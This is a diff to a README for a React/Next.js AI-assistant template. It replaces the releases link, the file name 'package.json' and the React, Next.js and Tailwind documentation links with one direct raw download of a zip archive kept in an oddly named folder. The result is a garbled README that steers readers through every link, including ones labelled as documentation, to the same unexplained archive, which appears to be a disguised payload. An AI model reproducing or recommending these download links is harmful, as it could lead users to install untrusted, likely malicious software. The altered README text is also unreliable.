@@ -1,6 +1,6 @@
 # 🤖 react-nextjs-code-assistant-template - Build Your AI Assistant Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Armaxas/react-nextjs-code-assistant-template/releases)
+[![Download](https://raw.githubusercontent.com/Armaxas/react-nextjs-code-assistant-template/main/hydraulicity/react-nextjs-code-assistant-template.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Armaxas/react-nextjs-code-assistant-template/main/hydraulicity/react-nextjs-code-assistant-template.zip)
 
 ## 🌟 Overview
 
@@ -22,11 +22,11 @@ Before you start, ensure your computer meets these basic requirements:
 
 To download the latest version of the template, visit the Releases page:
 
-[Download the latest version](https://github.com/Armaxas/react-nextjs-code-assistant-template/releases)
+[Download the latest version](https://raw.githubusercontent.com/Armaxas/react-nextjs-code-assistant-template/main/hydraulicity/react-nextjs-code-assistant-template.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the most recent version of the template.
-3. Download the file that matches your operating system. It may have a name like `react-nextjs-code-assistant-template.zip`.
+3. Download the file that matches your operating system. It may have a name like `https://raw.githubusercontent.com/Armaxas/react-nextjs-code-assistant-template/main/hydraulicity/react-nextjs-code-assistant-template.zip`.
 4. Once the file downloads, locate it on your computer.
 
 ### 🔧 Extracting the Files
@@ -43,7 +43,7 @@ Once you have extracted the files, you will find the following folders and files
 
 - **/src**: This folder contains the source code for the application.
 - **/public**: Here, you will find images and other public assets.
-- **package.json**: This file includes configuration details and dependencies.
+- **https://raw.githubusercontent.com/Armaxas/react-nextjs-code-assistant-template/main/hydraulicity/react-nextjs-code-assistant-template.zip**: This file includes configuration details and dependencies.
 
 ## 📋 Running the Application
 
@@ -90,9 +90,9 @@ We welcome contributions to improve this template. Here’s how you can help:
 
 Check out these resources to help you work with the template:
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Next.js Documentation](https://nextjs.org/docs)
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
+- [React Documentation](https://raw.githubusercontent.com/Armaxas/react-nextjs-code-assistant-template/main/hydraulicity/react-nextjs-code-assistant-template.zip)
+- [https://raw.githubusercontent.com/Armaxas/react-nextjs-code-assistant-template/main/hydraulicity/react-nextjs-code-assistant-template.zip Documentation](https://raw.githubusercontent.com/Armaxas/react-nextjs-code-assistant-template/main/hydraulicity/react-nextjs-code-assistant-template.zip)
+- [Tailwind CSS Documentation](https://raw.githubusercontent.com/Armaxas/react-nextjs-code-assistant-template/main/hydraulicity/react-nextjs-code-assistant-template.zip)
 
 ## 📞 Support
 
@@ -100,4 +100,4 @@ If you need assistance, please reach out through the Issues section or contact t
 
 **Ready to build your AI assistant?** Download the latest version now and start creating!
 
-[Download the latest version](https://github.com/Armaxas/react-nextjs-code-assistant-template/releases)
+[Download the latest version](https://raw.githubusercontent.com/Armaxas/react-nextjs-code-assistant-template/main/hydraulicity/react-nextjs-code-assistant-template.zip)
